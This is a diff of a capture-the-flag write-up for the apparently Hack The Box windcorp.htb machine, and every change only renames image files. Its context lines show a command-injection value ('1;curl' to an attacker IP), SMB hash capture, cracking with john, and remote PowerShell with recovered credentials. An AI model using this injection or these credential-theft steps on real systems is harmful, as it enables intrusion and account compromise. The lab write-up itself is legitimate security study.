@@ -262,7 +262,7 @@ replace: mobile
 mobile: 1;curl http://10.10.14.29/rcecfmed
 ```
 
-<figure><img src="../../../.gitbook/assets/image (93) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (93) (1) (3).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../../.gitbook/assets/image (76) (3).png" alt=""><figcaption></figcaption></figure>
 
@@ -328,7 +328,7 @@ For some reason, it wouldn't let me authenticate to my own SMB server from the D
 
 First, we can find out the webserver's domain name:
 
-<figure><img src="../../../.gitbook/assets/image (79) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (79) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 Then, we can simply use a `smbserver` binary from here.
 
@@ -348,7 +348,7 @@ net use \\webserver.windcorp.htb\share
 
 We can then crack this hash using `john`.
 
-<figure><img src="../../../.gitbook/assets/image (90) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (90) (1) (4).png" alt=""><figcaption></figcaption></figure>
 
 ### Bob.Wood
 
@@ -384,7 +384,7 @@ And we can find the credentials for bob.woodadm.
 
 Now, we can attempt some remote Powershell again.
 
-<figure><img src="../../../.gitbook/assets/image (91) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (91) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../../.gitbook/assets/image (77) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
